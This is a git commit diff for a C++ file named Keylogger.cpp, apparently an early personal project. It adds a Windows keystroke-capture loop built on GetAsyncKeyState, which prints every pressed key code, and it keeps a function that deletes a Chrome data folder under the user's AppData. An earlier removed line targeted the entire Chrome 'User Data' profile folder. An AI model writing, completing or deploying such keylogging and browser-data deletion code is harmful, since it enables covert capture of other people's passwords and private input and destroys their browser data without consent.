0025574b3292309104581567a025b0aa7c35375d
AlSharji0 <asharji1828@gmail.com>
2024-03-21 02:54:00 +0400

    modified:   Keylogger.cpp 	modified:   build/Debug/Keylogger.o 	modified:   build/Debug/outDebug.exe

--- Keylogger.cpp
+++ Keylogger.cpp
@@ -2,16 +2,21 @@
 #include <cstdlib>
 #include <string>
 #include <filesystem>
+#include <Windows.h>
 
 void clearBrowserCache(){
     std::string appData = getenv("APPDATA");
     if (appData.empty()) return ;
     else{
-        std::string cachePath = appData + "\\..\\Local\\Google\\Chrome\\User Data";
+        std::string cachePath = appData + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\";
         try{
             std::filesystem::remove_all(cachePath);
             std::string createpath = "mkdir" + cachePath;
-            system(createpath.c_str());
+            std::error_code ec;
+            std::filesystem::create_directory(cachePath, ec);
+            if (ec) {
+                std::cerr << "Error creating cache directory: " << ec.message() << '\n';
+            }
         }
         catch(const std::filesystem::filesystem_error& e){
             std::cerr << "Error removing cache directory: " << e.what() << '\n';
@@ -20,7 +25,17 @@ void clearBrowserCache(){
     }
 }
 
+void startLogging(){
+    while(true){
+        for (int i = 8; i <= 254; i++){
+            if (GetAsyncKeyState(i) & 0x1) {
+                std::cout << i;
+            }
+        }
+    }
+}
+
 int main(){
-    clearBrowserCache();
+    startLogging();
     return 0;
 }
